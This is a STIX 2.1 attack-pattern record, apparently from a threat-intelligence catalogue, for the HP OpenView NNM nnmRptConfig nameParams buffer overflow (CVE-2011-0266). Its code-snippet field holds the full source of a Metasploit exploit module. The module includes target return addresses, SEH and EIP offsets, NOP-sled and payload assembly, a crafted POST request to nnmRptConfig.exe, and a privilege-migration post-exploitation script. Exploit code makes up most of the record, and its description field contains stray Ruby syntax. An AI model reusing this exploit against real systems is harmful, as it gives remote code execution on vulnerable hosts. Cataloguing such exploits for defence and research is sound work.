{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f638a912-7ab8-4121-a8b2-8c34b908286d",
    "created": "2024-08-14T16:53:06.79165Z",
    "modified": "2024-08-14T16:53:06.791654Z",
    "name": "\"HP OpenView NNM nnmRptConfig nameParams Buffer Overflow\"",
    "description": " This module exploits a vulnerability in HP NNM's nnmRptConfig.exe. A remote user can send a long string data to the nameParams parameter via a POST request, which causes an overflow on the stack when function ov.sprintf_new() is used, and gain arbitrary code execution.'  'License'\t  => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_nnmrptconfig_nameparams.rb",
            "external_id": "hp_nnm_nnmrptconfig_nameparams.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0266"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"HP OpenView NNM nnmRptConfig nameParams Buffer Overflow\",\n      'Description' => %q{\n        This module exploits a vulnerability in HP NNM's nnmRptConfig.exe.\n        A remote user can send a long string data to the nameParams parameter via\n        a POST request, which causes an overflow on the stack when function\n        ov.sprintf_new() is used, and gain arbitrary code execution.'\n      },\n      'License'\t  => MSF_LICENSE,\n      'Author'      =>\n        [\n          'sinn3r',\n          'MC',\n        ],\n      'References' =>\n        [\n          ['CVE', '2011-0266'],\n          ['OSVDB', '70473'],\n          ['ZDI', '11-008']\n        ],\n      'Payload'\t =>\n        {\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [\n            'HP NNM 7.53 Windows Server 2003 Enterprise',\n            {\n              'Ret' => 0x5A30532D,    #POP/POP/RET OvWww.dll\n              'offset' => 46913,      #Offset to SEH chain\n              'Pops' => 13,           #Number of POPADs needed\n              'Payloadoffset' => 57,  #Offset to pyload\n            }\n          ],\n          [\n            'HP OpenView Network Node Manager 7.50',\n            {\n              'Ret' => 0x5a01d78d,   #JMP\n              'offset' => 5117,      #Offset to overwrite EIP\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-01-10'))\n  end\n\n  def exploit\n\n    sploit = ''\n    data   = ''\n\n    if target.name =~ /NNM 7.53/ && target.name =~ /Server 2003/\n\n      nops = make_nops(1000)*70\n\n      sploit << nops[0, target['offset']]\n      sploit << generate_seh_record(target.ret)\n      sploit << \"\\x61\"*target['Pops']\n      sploit << \"\\x51\"\n      sploit << \"\\xc3\"\n      sploit << nops[0, target['Payloadoffset']]\n      sploit << payload.encoded\n      sploit << nops[0, 70000-sploit.length]\n\n      data << \"Content&Action=Create&\"\n      data << \"Template=Avail/CRAvail&\"\n      data << \"Operation=Apply&\"\n      data << \"Params=schdParams+nameParams\"\n      data << \"&schdParams=schd_select1%3Ddaily%7Cmonthtodate&\"\n      data << \"nameParams=text1%3D#{sploit}%26text2%3Dtest2test%26text3%3Dtest2 HTTP/1.1\"\n\n    elsif target.name =~ /7.50/\n\n      #Courtersy of MC\n      sploit << rand_text_alpha_upper(target['offset'])\n      sploit << [target.ret].pack('V')\n      sploit << payload.encoded\n      sploit << rand_text_alpha_upper(8024 - 5117 - 4 - payload.encoded.length)\n\n      data << \"Content&Action=Modify&Template=Avail/General+Availabiilty/monthtodat\"\n      data << \"e&Operation=Apply&Params=schdParams+nameParams&schdParams=schd_select1%3Dmonto\"\n      data << \"date&nameParams=text1%3D#{sploit}%262%3D%263%3D\"\n\n    end\n\n    print_status(\"Trying target #{target.name}...\")\n\n    connect\n    send_request_raw({\n      'uri' => '/OvCgi/nnmRptConfig.exe',\n      'data' => data,\n      'version' => '1.1',\n      'method' => 'POST',\n      'headers' => {\n        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Accept-Language' => 'en-us,en;q=0.5',\n        'Accept-Encoding' => 'gzip,deflate',\n        'Accept-Charset' => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',\n        'Keep-Alive' => '300',\n        'Connection' => 'Keep-Alive',\n        'Cache-Control' => 'max-age=0',\n        'Content-Type' => 'application/x-www-form-urlencoded',\n      }\n    }, 3)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-10",
    "x_mitre_platforms": [
        "win'"
    ]
}